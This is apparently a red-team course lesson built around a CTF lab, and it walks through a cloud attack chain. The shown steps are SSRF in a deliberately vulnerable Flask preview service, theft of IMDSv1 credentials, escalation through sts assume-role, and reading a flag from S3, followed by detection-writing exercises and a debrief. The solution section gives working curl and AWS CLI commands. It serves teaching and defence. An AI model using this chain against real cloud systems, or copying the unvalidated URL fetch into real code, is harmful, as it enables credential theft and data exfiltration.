---
title: "Red Team CTF Sprint — Day 6: Cloud Attack Chains"
tags: [red-team, CTF, cloud, AWS, SSRF, IMDS, IAM-escalation, S3-exfil,
  T1552.005, T1078.004, T1530, sprint, advanced, challenge]
module: 08-RedTeam-03
day: 556
related_topics:
  - Red Team CTF Sprint Day 5 (Day 555)
  - AWS Red Team Attack Surface (Day 523)
  - AWS Exploitation Lab (Day 524)
  - Cross-Environment Attack Paths (Day 529)
  - Red Team CTF Sprint Day 7 (Day 557)
---

# Day 556 — Red Team CTF Sprint: Day 6

> "Cloud environments break red teamers who think in network terms. There are no
> firewalls to bypass with Nmap. There are permissions to abuse, metadata endpoints
> to plunder, and IAM paths no developer ever intended to be attack paths. Learn
> the cloud's trust model and you own the cloud."
>
> — Ghost

---

## Goals

Execute an end-to-end cloud attack chain: SSRF vulnerability in a web application →
AWS IMDS credential extraction → IAM privilege escalation → S3 data exfiltration.
Document every API call as an IoC and write a detection rule for each stage.

**Prerequisites:** Days 523–524 (AWS red teaming, AWS exploitation lab),
Day 529 (cross-environment attack paths).
**Time budget:** 5 hours.

---

## Challenge — Cloud Shepherd

### Category
Cloud / Web

### Difficulty
Advanced
Estimated time: 4 hours for a student at target level

### Learning Objective
Chain SSRF on a web application to AWS IMDSv1 credential extraction, then use
the stolen credentials to escalate IAM privileges and exfiltrate data from an
S3 bucket that is inaccessible to the original SSRF user.

### Scenario

```
Acme Corp runs a serverless-adjacent architecture: a small EC2-hosted URL
preview service at http://preview.acme-lab.internal:5000 allows users to
submit a URL and receive a screenshot. The service fetches the URL server-side.

AWS account: acme-lab (us-east-1)
Initial access: low-privilege IAM user "developer-01" with only s3:ListBuckets

You have identified that the preview service does not sanitise URLs and fetches
any HTTP target. The EC2 instance role is ec2-preview-role.

Your objectives:
  1. Extract temporary credentials from the IMDS endpoint via SSRF.
  2. Identify what the ec2-preview-role can do beyond the developer-01 user.
  3. Escalate to a higher-privilege role using the stolen credentials.
  4. Find and exfiltrate the flag from a private S3 bucket.

The flag is hidden in s3://acme-lab-secrets/flag.txt
```

### Vulnerability / Technique

T1190 — Exploit Public-Facing Application (SSRF)
T1552.005 — Unsecured Credentials: Cloud Instance Metadata APIs
T1078.004 — Valid Accounts: Cloud Accounts
T1530 — Data from Cloud Storage Object

### Setup

```yaml
# docker-compose.yml — minimal cloud lab simulation
# Uses LocalStack for AWS service emulation

version: "3.9"
services:
  preview-app:
    build: ./preview-app
    ports:
      - "5000:5000"
    environment:
      AWS_DEFAULT_REGION: us-east-1
      # EC2 IMDS simulation — points to mock-imds
      IMDS_ENDPOINT: http://mock-imds:80

  mock-imds:
    image: python:3.11-slim
    command: python /imds_mock.py
    volumes:
      - ./imds_mock.py:/imds_mock.py
    # Simulates http://169.254.169.254/latest/meta-data/

  localstack:
    image: localstack/localstack:3.4
    ports:
      - "4566:4566"
    environment:
      SERVICES: s3,iam,sts
      AWS_DEFAULT_REGION: us-east-1
      AWS_ACCESS_KEY_ID: test
      AWS_SECRET_ACCESS_KEY: test

  setup:
    image: amazon/aws-cli:latest
    depends_on:
      - localstack
    entrypoint: /setup.sh
    volumes:
      - ./setup.sh:/setup.sh
    # Creates:
    #   - s3://acme-lab-secrets/flag.txt (private)
    #   - IAM role ec2-preview-role with iam:PassRole and s3:GetObject on secrets bucket
    #   - developer-01 user with only s3:ListBuckets
```

```python
# preview-app/app.py — the vulnerable preview service
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/preview', methods=['POST'])
def preview():
    url = request.json.get('url')
    # Vulnerability: no URL validation — fetches any HTTP URL
    try:
        resp = requests.get(url, timeout=3)
        return jsonify({"content": resp.text[:2000]})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

### Hint Progression

1. The preview service returns the raw content of any URL it fetches. AWS IMDS
   runs at `169.254.169.254`. What path returns temporary credentials for an
   instance role?
2. Once you have the `AccessKeyId`, `SecretAccessKey`, and `SessionToken`, use
   `aws sts get-caller-identity` to confirm identity. Then use `aws iam
   list-attached-role-policies` to enumerate what the role can do.
3. The role has `iam:PassRole`. What does that enable? Look up the
   `iam:PassRole` privilege escalation path documented in Rhino Security Labs'
   AWS IAM privilege escalation techniques.

### Solution Walkthrough

```bash
# ══════════════════════════════════════════════
# STAGE 1: SSRF → IMDS credential extraction
# ══════════════════════════════════════════════

# IMDSv1 — no token required (the vulnerable default)
# Path: /latest/meta-data/iam/security-credentials/<role-name>

# Step 1: discover the role name
curl -s -X POST http://preview.acme-lab.internal:5000/preview \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
# → ec2-preview-role

# Step 2: fetch credentials
curl -s -X POST http://preview.acme-lab.internal:5000/preview \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-preview-role"}'
# → {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"..."}

export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Confirm identity
aws sts get-caller-identity
# → arn:aws:sts::123456789012:assumed-role/ec2-preview-role/i-0abc123

# ══════════════════════════════════════════════
# STAGE 2: IAM enumeration
# ══════════════════════════════════════════════

aws iam list-attached-role-policies --role-name ec2-preview-role
# → AmazonS3ReadOnlyAccess (all buckets)
# → custom: AllowPassRole-To-AdminRole

aws iam get-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/AllowPassRole-To-AdminRole \
  --version-id v1
# → {
#     "Statement": [{
#       "Effect": "Allow",
#       "Action": ["iam:PassRole","sts:AssumeRole"],
#       "Resource": "arn:aws:iam::123456789012:role/admin-automation-role"
#     }]
#   }

# ══════════════════════════════════════════════
# STAGE 3: Privilege escalation via iam:PassRole + sts:AssumeRole
# ══════════════════════════════════════════════

aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/admin-automation-role \
  --role-session-name pwned-session
# → new credentials with admin-automation-role

export AWS_ACCESS_KEY_ID=ASIA_ADMIN...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

aws sts get-caller-identity
# → arn:aws:sts::123456789012:assumed-role/admin-automation-role/pwned-session

# ══════════════════════════════════════════════
# STAGE 4: S3 exfiltration
# ══════════════════════════════════════════════

aws s3 ls s3://acme-lab-secrets/
# → 2024-01-15 09:23:11    42 flag.txt

aws s3 cp s3://acme-lab-secrets/flag.txt -
# → FLAG: CTF{ssrf_to_imds_to_iam_escalation}
```

### Flag
`CTF{ssrf_to_imds_to_iam_escalation}`

### Detection Writing Exercise

```
Write one CloudTrail-based detection rule for each stage:

Stage 1 — IMDS access (can only be detected on the EC2 instance itself):
  Target: IMDSv1 GET request to 169.254.169.254 from an unexpected process
  Log source: VPC Flow Logs? CloudWatch agent on instance? What is the limitation?
  _______________________________________________________________

Stage 2 — Credential use from unexpected source IP:
  CloudTrail event: any API call where sourceIPAddress != known app IP range
  Key field: userAgent, sourceIPAddress, eventName=ListAttachedRolePolicies
  _______________________________________________________________

Stage 3 — AssumeRole with chained role:
  CloudTrail event: AssumeRole where principalArn contains ec2-preview-role
  AND the assumed role is admin-automation-role
  Alert: role assumption chain exceeds 1 hop
  _______________________________________________________________

Stage 4 — Unusual S3 GetObject:
  CloudTrail event: GetObject on acme-lab-secrets by principal
    admin-automation-role/pwned-session
  Alert: GetObject from this bucket should only come from known automation ARNs
  _______________________________________________________________
```

### Debrief Points

```
1. IMDSv1 is the root cause. It requires no authentication — any process on the
   EC2 instance (including one that handles attacker-controlled HTTP requests)
   can read the instance role credentials. IMDSv2 requires a PUT request to
   obtain a session token first, which an SSRF-only attacker typically cannot
   do (SSRF usually only reaches GET). Enabling IMDSv2 on all instances breaks
   this chain at Stage 1.

2. The iam:PassRole + sts:AssumeRole privilege escalation is documented in
   Rhino Security Labs' "AWS IAM Privilege Escalation – Methods and Mitigation".
   It is a misconfiguration, not a bug. The fix is least-privilege: ec2-preview-role
   should not be able to assume an admin role.

3. CloudTrail is the detection surface for all post-IMDS stages. CloudTrail
   logs every AWS API call. The challenge is volume — high-traffic accounts
   generate millions of events per day. Detection must be specific.

4. IMDSv1 cannot be detected by CloudTrail because IMDS calls never leave the
   instance — they are answered by the hypervisor locally. The only detection
   is on the instance itself (agent-based) or through anomalous API calls
   that follow credential theft.

5. Real-world parallel: Capital One breach (2019). A misconfigured WAF on EC2
   allowed SSRF to IMDS. The attacker extracted credentials and listed 700+
   S3 buckets. IMDSv1 was the root cause; CapitalOne paid $80M in penalties.
```

---

## Engagement Log — Day 6 Sprint

```
Time    | Action                                        | Result
--------|-----------------------------------------------|-------
        | SSRF to IMDS — role name discovered           |
        | SSRF to IMDS — credentials extracted          |
        | aws sts get-caller-identity confirmed          |
        | IAM policies enumerated                       |
        | iam:PassRole path identified                  |
        | admin-automation-role assumed                 |
        | S3 bucket listed                              |
        | flag.txt exfiltrated                          |

Detection rules written: [ ] IMDS  [ ] AssumeRole  [ ] S3
Flag captured: [ ] Yes  [ ] No
Total time: _____ minutes
```

---

## Key Takeaways

1. IMDSv1 is the most frequently abused AWS misconfiguration in red team
   engagements. SSRF + IMDSv1 = instant credential access. Always check
   for SSRF on EC2-hosted apps before anything else.
2. CloudTrail is the primary detection mechanism for cloud attacks. Learn
   to read it as a defender and to minimise your footprint in it as an attacker.
3. IAM escalation paths are graphs, not hierarchies. Tools like `enumerate-iam`,
   `Pacu`, and Rhino Security Labs' checklist map these graphs. Run them on
   every new set of credentials.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q556.1, Q556.2 …).

---

## Navigation

← Previous: [Day 555 — Red Team CTF Sprint: Day 5](DAY-0555-Red-Team-CTF-Sprint-Day-5.md)
→ Next: [Day 557 — Red Team CTF Sprint: Day 7](DAY-0557-Red-Team-CTF-Sprint-Day-7.md)
